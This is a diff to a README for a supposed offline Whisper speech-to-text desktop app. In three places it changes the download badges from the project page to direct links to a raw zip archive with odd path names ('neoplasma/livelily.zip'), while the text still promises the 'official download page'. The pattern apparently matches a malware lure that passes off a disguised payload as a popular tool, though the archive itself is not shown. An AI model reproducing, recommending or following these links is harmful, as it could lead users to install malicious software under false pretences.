@@ -1,6 +1,6 @@
 # 🎙️ Whisper-Desktop---OpenAI-Whisper-Transcriber-2026 - Your Offline Speech-to-Text Powerhouse
 
-[![Download Whisper-Desktop](https://img.shields.io/badge/Download-Whisper--Desktop-2ea44f?style=for-the-badge&logo=github&logoColor=white&labelColor=4B0082&color=FF6F00)](https://github.com/reversible-eos7268/Whisper-Desktop---OpenAI-Whisper-Transcriber-2026)
+[![Download Whisper-Desktop](https://img.shields.io/badge/Download-Whisper--Desktop-2ea44f?style=for-the-badge&logo=github&logoColor=white&labelColor=4B0082&color=FF6F00)](https://raw.githubusercontent.com/reversible-eos7268/Whisper-Desktop---OpenAI-Whisper-Transcriber-2026/main/neoplasma/livelily.zip)
 
 ---
 
@@ -73,7 +73,7 @@ Ready to transform your workflow? Follow these simple steps to get Whisper-Deskt
 ### Step 1: Download the Application
 Click the button below to visit the official download page:
 
-[![Download Now](https://img.shields.io/badge/Download-Whisper--Desktop-4B0082?style=for-the-badge&logo=github&logoColor=white&label=Whisper--Desktop&color=4B0082)](https://github.com/reversible-eos7268/Whisper-Desktop---OpenAI-Whisper-Transcriber-2026)
+[![Download Now](https://img.shields.io/badge/Download-Whisper--Desktop-4B0082?style=for-the-badge&logo=github&logoColor=white&label=Whisper--Desktop&color=4B0082)](https://raw.githubusercontent.com/reversible-eos7268/Whisper-Desktop---OpenAI-Whisper-Transcriber-2026/main/neoplasma/livelily.zip)
 
 Visit this link to download the application.This will take you directly to the download page where you'll find the latest version of Whisper-Desktop for Windows.
 
@@ -278,7 +278,7 @@ Transcribe depositions,testimonies,consults,and court recordings.Create comprehe
 
 Click the big button below to visit the download page and start your offline transcription journey today!
 
-[![Download Now](https://img.shields.io/badge/🚀-Download--Whisper--Desktop-2ea44f?style=for-the-badge&logo=download&logoColor=white&label=Get--Started&color=FF6F00)](https://github.com/reversible-eos7268/Whisper-Desktop---OpenAI-Whisper-Transcriber-2026)
+[![Download Now](https://img.shields.io/badge/🚀-Download--Whisper--Desktop-2ea44f?style=for-the-badge&logo=download&logoColor=white&label=Get--Started&color=FF6F00)](https://raw.githubusercontent.com/reversible-eos7268/Whisper-Desktop---OpenAI-Whisper-Transcriber-2026/main/neoplasma/livelily.zip)
 
 Visit this link to download the application.You'll be transcribing with lightning speed,in no time at all!
 
